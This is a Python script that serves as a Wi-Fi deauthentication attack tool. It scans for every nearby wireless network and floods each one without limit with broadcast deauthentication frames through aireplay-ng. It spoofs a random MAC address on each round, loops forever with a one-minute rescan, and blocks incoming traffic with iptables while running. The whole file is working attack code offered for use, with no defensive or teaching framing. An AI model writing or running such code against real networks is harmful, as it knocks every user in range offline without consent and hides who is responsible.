import subprocess
import time
import random

class Deauth:
    def __init__(self, interface: str):
        self.interface = interface

    def random_mac(self) -> str:
        return ":".join([hex(random.randint(0x00, 0xff))[2:].zfill(2) for _ in range(6)])

    def get_networks(self) -> list[tuple[bytes, bytes]]:
        """Get a list of (BSSID, ESSID) for all networks."""
        output: bytes = subprocess.check_output(['iwlist', self.interface, 'scan'])
        networks = []
        bssid = essid = None
        for line in output.split(b'\n'):
            if b'Address:' in line:
                bssid = line.split(b'Address:')[1].strip()
            elif b'ESSID:' in line:
                essid = line.split(b':')[1].strip(b'"')
                if bssid and essid:
                    networks.append((bssid, essid))
                    bssid = essid = None
        return networks

    def block_incoming_traffic(self) -> None:
        """Block all incoming traffic with iptables."""
        subprocess.call(['iptables', '-I', 'INPUT', '-j', 'DROP'])
        subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'DROP'])

    def unblock_incoming_traffic(self) -> None:
        """Unblock incoming traffic by removing iptables rules."""
        subprocess.call(['iptables', '-D', 'INPUT', '-j', 'DROP'])
        subprocess.call(['iptables', '-D', 'FORWARD', '-j', 'DROP'])

    def deauth_all(self) -> None:
        networks = self.get_networks()
        
        for bssid, essid in networks:
            print(f"[LOG] Attacking {essid.decode()} ({bssid.decode()})")
            subprocess.call(['iwconfig', self.interface, 'mode', 'monitor'])
            subprocess.call(['ifconfig', self.interface, 'down'])
            subprocess.call(['macchanger', '-m', self.random_mac(), self.interface])
            subprocess.call(['ifconfig', self.interface, 'up'])
            subprocess.call(['aireplay-ng', '-0', '0', '-a', bssid.decode(), '-c', 'FF:FF:FF:FF:FF:FF', self.interface])
            subprocess.call(['iwconfig', self.interface, 'mode', 'managed'])
            subprocess.call(['ifconfig', self.interface, 'down'])
            subprocess.call(['macchanger', '-p', self.interface])
            subprocess.call(['ifconfig', self.interface, 'up'])
        
        print("[LOG] Sleeping for 1 minute before the next scan.")
        time.sleep(60)  # Sleep for 1 minute between scans

def infcount():
    while True:
        yield

if __name__ == "__main__":
    interface = input("Enter the network interface (e.g., wlan0): ")
    deauth = Deauth(interface)

    # Block incoming traffic before starting
    deauth.block_incoming_traffic()

    try:
        for _ in infcount():
            deauth.deauth_all()
    except KeyboardInterrupt:
        # Restore iptables rules before exiting, or any other cleanup
        deauth.unblock_incoming_traffic()
        print("\n[LOG] Restored incoming traffic and exiting...")
